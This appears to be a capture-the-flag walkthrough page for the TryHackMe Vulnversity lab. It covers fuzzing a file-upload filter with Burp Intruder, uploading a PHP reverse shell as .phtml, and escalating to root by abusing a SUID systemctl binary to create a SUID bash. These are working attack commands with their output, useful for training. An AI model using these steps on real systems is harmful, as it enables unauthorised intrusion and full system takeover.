---
sidebar_position: 2
description: Vulnversity
sidebar_label: Exploitation
keywords: [vulnversity, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, privilege escalation, systemctl privilege escalation, burpsuite]
---

# [Vulnversity] Exploitation

## BurpSuite


There is a <span style={{fontWeight: 'Bold'}}>Server Side Filtering</span> which Prevents us from Uploading specific <span style={{fontWeight: 'Bold'}}>File Extensions.</span> We can use <b style={{ color: 'Grey' }}>BURP:Intruder</b> to <span style={{fontWeight: 'Bold'}}>FUZZ</span> <b style={{ color: 'Coral' }}>file.<b style={{ color: 'LightGreen' }}>[EXTENSION_TO_FUZZ]</b></b> Extension to Find which one can be Uploaded. 

<br/>

- In this case the Extension <b style={{ color: 'Coral' }}>file.<b style={{ color: 'LightGreen' }}>[phtml]</b></b> is not Blacklisted.

```log
POST /internal/index.php HTTP/1.1
Host: 10.10.242.24:3333
Content-Length: 283
Origin: http://10.10.242.24:3333
Referer: http://10.10.242.24:3333/internal/index.php
Connection: close

// highlight-next-line
Content-Disposition: form-data; name="file"; filename="file.md" -->> FUZZING `.md` Parameter to find the Allowed Extensions
Content-Type: text/markdown
```

<br/>

- **The `Reverse Shell` got Successfully Uploaded to:** <b style={{ color: 'SandyBrown' }}>[IP:3333/internal/uploads]</b>

```log
   [ICO]             Name            Last modified   Size Description
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PARENTDIR] Parent Directory                            -  
[ ]         php-reverse-shell.phtml 2022-10-07 05:09 5.4K  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```


<br/>

---
## Privilege Escalation

- **We can catch the Reverse Shell Using `Netcat`** 

```bash
www-data@vulnuniversity /$  id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<br/>

- The <b style={{ color: 'Coral' }}>/bin/systemctl</b> Binary has the <b style={{ color: 'Red' }}>SUID</b> Bit Set.

```bash
www-data@vulnuniversity /$  find / -type f -perm -04000 -ls 2>/dev/null
   ...
   131166    648 -rwsr-xr-x   1 root     root         659856 Feb 13  2019 /bin/systemctl
   ...
```

<br/>

- We can copy the `BASH` Binary into the `/tmp` Folder and make the `SYSTEMCTL` Service set a `SUID` Bit on that Binary.  

```bash
www-data@vulnuniversity tmp$  TF=$(mktemp).service
www-data@vulnuniversity tmp$  TF=$(mktemp).service
www-data@vulnuniversity tmp$  echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "cp /bin/bash /tmp && chown root:root /tmp/bash && chmod 4777 /tmp/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity tmp$  systemctl link $TF
Created symlink from /etc/systemd/system/tmp.o1RIIbIg2b.service to /tmp/tmp.o1RIIbIg2b.service.
www-data@vulnuniversity tmp$  systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.o1RIIbIg2b.service to /tmp/tmp.o1RIIbIg2b.service.
```

<br/>


- Since the `BASH` Binary has the <b style={{ color: 'Red' }}>SUID</b> Bit Set we can run with <b style={{ color: 'Red' }}>ROOT</b> Permissions.

```bash
www-data@vulnuniversity tmp$  ./bash -p
www-data@vulnuniversity tmp$  id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
www-data@vulnuniversity tmp$  whoami
root
```

---